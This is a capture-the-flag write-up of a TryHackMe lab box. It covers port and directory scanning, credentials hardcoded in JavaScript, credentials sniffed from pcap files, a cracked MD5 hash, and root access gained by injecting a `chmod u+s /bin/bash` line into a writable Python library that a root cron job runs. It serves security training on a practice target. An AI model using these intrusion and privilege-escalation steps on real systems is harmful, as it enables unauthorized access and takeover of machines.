# [Valley THM Room](https://tryhackme.com/room/valleype)
## Scanning
### Nmap
```
nmap -sC -sV -oN nmapInitial target-ip
```

```python
Starting Nmap 7.60 ( https://nmap.org ) at 2023-12-06 16:07 GMT
Nmap scan report for ip-10-10-216-122.eu-west-1.compute.internal (target-ip)
Host is up (0.00016s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 02:D5:F5:4C:30:31 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.30 seconds
```

### Gobuster
```
gobuster dir -u http://target-ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
```

```python
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://target-ip
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/12/06 16:13:20 Starting gobuster
===============================================================
/gallery (Status: 301)
/static (Status: 301)
/pricing (Status: 301)
/server-status (Status: 403)
===============================================================
2023/12/06 16:13:37 Finished
===============================================================
```

## Enumeration
### Port 80
- When we navigate to that IP address through our web browser, we are met with the following webpage:

![Valley Photo Co Landing Page](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/b656e387-3b6e-4bd3-ab5b-8b0a048b1fa5)


- While [Gobuster](https://github.com/OJ/gobuster) runs, we can do some manual enumeration. First, I like to view the page source and see if there is anything of note like comments left by developers that contain any juicy information. There isn't anything particularly interesting here, so we can move on.
- We can use a web scanner like [Nikto](https://github.com/sullo/nikto) to provide additional information while we investigate our [Gobuster](https://github.com/OJ/gobuster) results. 
- From [Gobuster](https://github.com/OJ/gobuster), we can see that there are a few directories we can look at. First, let's go look at the `/gallery` directory. When we get there, we are met with the following page:

![Gallery for Valley](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/9ce97180-5285-47c0-ab9b-f539eace986c)


- This appears to just be a group of pictures for the base web application. There aren't any hidden comments or anything worthwhile in the page source, so let's move on. 

- When we go to the `/pricing` directory, we are greeted with a few things. Most notably, there seems to be a `note.txt` file. When we open it, we can see the following:
```
J,
Please stop leaving notes randomly on the website
-RP
```

- This gives us some information regarding what to look for. It also gives us little hints regarding potential administrators and what their names/initials might be. 
- For further enumeration, I tried running [Gobuster](https://github.com/OJ/gobuster) on the `/gallery` and `/pricing` directories, but didn't find anything noteworthy. 
- However, when we run [Gobuster](https://github.com/OJ/gobuster) on the `/static` directory, we get a list of numbers. If you visit most of these, you can see that they are just the pictures hosted on the `/gallery.html` page. All except one called `/00`. Once we navigate to this page, we are greeted with the following note:
```
dev notes from valleyDev:
-add wedding photo examples
-redo the editing on #4
-remove /dev1243224123123
-check for SIEM alerts
```

- This seems to indicated that there is a hidden directory called `/dev1243224123123`. Let's go investigate. When we arrive at that page, we are greeted with the following:

![Valley Photo Co  Dev Login](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/e6b6fbf2-e327-4766-9a37-9561aca11aa7)


- We can play around with some basic user/pass combinations if we want to, but, as usual, I wanted to check the page source. Luckily, I found reference to a `dev.js` file and was able to peek behind the current. Here is what is looks like:
```js
const loginForm = document.getElementById("login-form");
const loginButton = document.getElementById("login-form-submit");
const loginErrorMsg = document.getElementById("login-error-msg");

loginForm.style.border = '2px solid #ccc';
loginForm.style.padding = '20px';
loginButton.style.backgroundColor = '#007bff';
loginButton.style.border = 'none';
loginButton.style.borderRadius = '5px';
loginButton.style.color = '#fff';
loginButton.style.cursor = 'pointer';
loginButton.style.padding = '10px';
loginButton.style.marginTop = '10px';


function isValidUsername(username) {

	if(username.length < 5) {

	console.log("Username is valid");

	}
	else {

	console.log("Invalid Username");

	}

}

function isValidPassword(password) {

	if(password.length < 7) {

        console.log("Password is valid");

        }
        else {

        console.log("Invalid Password");

        }

}

function showErrorMessage(element, message) {
  const error = element.parentElement.querySelector('.error');
  error.textContent = message;
  error.style.display = 'block';
}

loginButton.addEventListener("click", (e) => {
    e.preventDefault();
    const username = loginForm.username.value;
    const password = loginForm.password.value;

    if (username === "siemDev" && password === "california") {
        window.location.href = "/dev1243224123123/devNotes37370.txt";
    } else {
        loginErrorMsg.style.opacity = 1;
    }
})
```

- The most important thing that I see in this code is the `loginButton` function that gives us an if/else statement that gives us the username and password combination. With this, we can successfully login. Here is what we see when we do:
```
dev notes for ftp server:
-stop reusing credentials
-check for any vulnerabilies
-stay up to date on patching
-change ftp port to normal port
```

- It looks like J has left more notes around the application. With this new information, I want to revisit our [Nmap](https://nmap.org/) scan and adjust it a bit to see if there is an FTP service running on a non-standard port as indicated by this note. We can do that with the following syntax:
```
nmap -sC -sV -oN nmapFullScan target-ip -p- -vv
```

- This will scan all ports, not just the most common 1000. This may take some time, but hopefully it will provide us with more information that will allow us to move forward. Using the `-vv` switch for very verbose output will hopefully speed this up and will show us what it finds as soon as it is found. Here is the output:

- To be honest, I did use [RustScan](https://github.com/RustScan/RustScan) with the following syntax to get quicker results since [Nmap](https://nmap.org/) was taking so long:
```
rustscan -a target-ip
```

## System Hacking
Now we can try to login to the FTP server on the nonstandard port. Another part of the note references reusing login credentials. We can try to use the `siemDev`/`california` username and password combination to attempt to login to the FTP service.
```
Connected to 10.10.205.132.
220 (vsFTPd 3.0.3)
Name (10.10.205.132:root): siemDev
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000         7272 Mar 06  2023 siemFTP.pcapng
-rw-rw-r--    1 1000     1000      1978716 Mar 06  2023 siemHTTP1.pcapng
-rw-rw-r--    1 1000     1000      1972448 Mar 06  2023 siemHTTP2.pcapng
226 Directory send OK.
ftp> 
```

- This works! Now we can look around and see what we can get. We can use the `get` command to pull down all of the `.pcapng` files that are hosted on the FTP server. Once we have them, we can enumerate further. 
- Let's take a look at the `siemFTP.pcapng` file with [Wireshark](https://www.wireshark.org/download.html) and see what we can see.

![FTP PCAP in Wireshark ](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/fab3dbf4-436c-4087-ad0f-fef2cf26b60f)


- We can see a user/pass combination of `anonymous`/`anonymous` that was successfully used to authenticate to what seems to be an FTP service. Unfortunately, that doesn't really get us anywhere. 
- Looking at `siemHTTP1.pcapng` it looks like the traffic is primarily related to testing a web filter when following the HTTP stream, and it doesn't provide us with much information either. 
- However, in `siemHTTP2.pcapng`, we can follow the HTTP stream and get the following:
```js
HTTP/1.1 200 OK
Date: Mon, 06 Mar 2023 21:04:44 GMT
Server: Apache/2.4.55 (Debian)
Last-Modified: Mon, 06 Mar 2023 20:46:17 GMT
ETag: "2fc-5f64162f52399-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 369
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html

 <form action="index.html" method="post">
  <div class="imgcontainer">
    <img src="img_avatar2.png" alt="Avatar" class="avatar">
  </div>

  <div class="container">
    <label for="uname"><b>Username</b></label>
    <input type="text" placeholder="Enter Username" name="uname" required>

    <label for="psw"><b>Password</b></label>
    <input type="password" placeholder="Enter Password" name="psw" required>

    <button type="submit">Login</button>
    <label>
      <input type="checkbox" checked="checked" name="remember"> Remember me
    </label>
  </div>

  <div class="container" style="background-color:#f1f1f1">
    <button type="button" class="cancelbtn">Cancel</button>
    <span class="psw">Forgot <a href="#">password?</a></span>
  </div>
</form> 
```

- This looks like a login page that prompts the user for a username and password combination. If we keep looking, we may be able to find a packet that contains the credentials used to authenticate. 
- Digging a little deeper, we can see that there was a POST done by the user. Upon inspecting that packet, we are presented with login credentials:

![HTTP2 Wireshark Credentials](https://github.com/morganbritt19/CTF-Writeups/assets/60797871/67c0e754-63ce-46b0-9073-2370c9275a27)


- Now we have the user/pass combination of `valleyDev`/`ph0t0s1234`. Let's try and use this so log in via SSH on port 22, since that is the only service we have not played around with yet:
```
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro
valleyDev@valley:~$ 
```
- This seems to be successful and we now have a foothold on the machine. You can `cat user.txt` in the user home directory and get the user flag. 

## Privilege Escalation
- The first thing I tried doing when getting onto the box was running `sudo -l` to see what the `valleyDev` user could run with sudo permissions. Unfortunately, it doesn't seem like they have any, so we should look around more and see what we can discover. 
- When we move to the `/home` directory, we can see a few other users. We know we can log into the `siemDev` account with the `california` password, but that doesn't seem to be very helpful since their home directory only contains the FTP files we found earlier, and they can't run sudo on the machine either. 
- There is, however, an ELF binary file named `valleyAuthenticator`. When viewing the permissions, we see that it can be ran as root:
```
valleyDev@valley:/home$ ls -la
total 752
drwxr-xr-x  5 root      root        4096 Mar  6  2023 .
drwxr-xr-x 21 root      root        4096 Mar  6  2023 ..
drwxr-x---  4 siemDev   siemDev     4096 Mar 20  2023 siemDev
drwxr-x--- 16 valley    valley      4096 Mar 20  2023 valley
-rwxrwxr-x  1 valley    valley    749128 Aug 14  2022 valleyAuthenticator
drwxr-xr-x  5 valleyDev valleyDev   4096 Dec  6 10:25 valleyDev
```

- When we try to run this executable, it prompts us for a username/password combination. Unfortunately, it doesn't look like the `valleyDev` or `siemDev` user credentials we have works. 
- Let's try to move this to our attacker machine for further analysis. We can start up a python web server in the same directory where the `valleyAuthenticator` file is with the following syntax:
```python
python3 -m http.server
```

- We can pull this over with `wget`:
```
wget http://target-ip:8000/valleyAuthenticator
```

- Now that it is on our machine, let's play around with it. We can leverage some of our CTF skills and do some basic analysis with techniques like [[Knowledge Base/Teaming Resources/Purple Team/Metadata/Strings|Strings]] and `grep`. We can look for interesting keywords like `user` or `username` and see what we can come up with.
```
strings valleyAuthenticator | grep user
```

- When we run the above, we get the following:
```
is your usernad
```

- This leads me to believe that there may be some hidden credentials in here for the sake of authentication. We can do some more grepping or manual review to find more information. Personally, I used the following command to create a text file I could open with Sublime Text to help me search around:
```
strings valleyAuthenticator | tee strings.txt
```

- I used the search function in Sublime Text to search for the `is your usernad` string to see if there was anything else in plain text around it and found the following snippet:
```
kx!S
;B@l
~`g{
xpbT
A [3	<
?ATs
-^;x&
e6722920bab2326f8217e4
bf6b1b58ac
ddJ1cc76ee3
beb60709056cfbOW
elcome to Valley Inc. Authentica
[k0rHh
 is your usernad
Ol: /passwXd.{
~{edJrong P= 
sL_striF::_M_M
v0ida%02xo
~ c-74
lrec
{4_af$
oBof '
1__g
_lock_
rorOu
```

- To me, the `e6722920bab2326f8217e4` string looks somewhat like a hash when compared with the rest of the strange characters that strings will output for us. Also, we know that there is some kind of authentication mechanism in this ELF binary, so it wouldn't hurt to try. We can use something like [Hashes](https://hashes.com/en/tools/hash_identifier) to verify what it is, and then feed it into [John The Ripper](https://github.com/openwall/john), [Hashcat](https://hashcat.net/hashcat/), and the like to crack it. For the sake of ease, I went with [Crackstation](https://crackstation.net/). It looks like the hash is MD5 and, once cracked, gives us the password: `liberty123`
- Now that we have the password, we need to find a username to pair it with. Back on the machine there is another username that we haven't done anything with yet under the same `/home` directory where we found the `valleyAuthenticator` application. We could potentially try to login to that account via SSH with the password we just recovered, or we could just switch users with the shell we already have. 
- This works and we are now the valley user, however, we still can't run sudo on the machine. We still can't bring over [LinPEASS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS), so we have to do more manual enumeration. 
- Let's look at more information about the `valley` account. We can use the `id` command to get the following output:
```
uid=1000(valley) gid=1000(valley) groups=1000(valley),1003(valleyAdmin)
```

- So, the `valley` user is a part of the `valleyAdmin` group. Let's check around and see what that means and what the users belonging to that group can do. We can do this with the following command:
```
find / -group valleyAdmin
```

- This will do a few things. First, it will look through the entire filesystem and return anything that falls under that group. Also, it will return a bunch of `Permission Denied` errors since I didn't route the errors to `dev/null`. While looking through the output of that command, we can see that we don't get an error for the following:
```
/usr/lib/python3.8/base64.py
```

- After looking around more, it looks like there is some kind of cron job that runs every so often. In my mind, this `base64.py` script might be a part of what they consider encryption. Here is the output of `cat /etc/crontab`:
```
valley@valley:/home$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
1  *    * * *   root    python3 /photos/script/photosEncrypt.py
```

- Since we can edit that file, why don't we trying using it to spawn a root shell? We can do that by adding the following syntax to the top of the script:
```
import os

os.system("chmod u+s /bin/bash")
```

- Now we can wait a little bit for the cronjob to run. After a minute, we can enter `bash -p` into our terminal and, provided everything went the way it should've, we will see the following:
```
valley@valley:/$ bash -p
bash-5.0# whoami
root
bash-5.0# 
```

- Now all we have to do is `cat /root/root.txt` and we will get the flag.

## Rabbit Holes
- I spent awhile trying to get [LinPEASS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) over onto the machine for some automated enumeration, but I couldn't pull it down directly with cURL since it wasn't installed on the machine and I wasn't root so I couldn't download it. Instead, I downloaded it onto my attacking machine and tried to host it on a simple python webserver and use `wget` to pull it over, but that didn't work either. 
- When trying to crack the hash found in the `strings.txt` file, I kept adding the hexadecimal text that was found underneath it into the string for cracking rather than just the `e6722920bab2326f8217e4`.
- I kept trying to pair the cracked password with usernames like `v0ida` or `k0rHh`, which are strings found near the password hash to successfully authenticate to the `valleyAuthenticator` file. That wasn't needed, since there was another user account on the box called `valley` that hadn't been touched yet. 

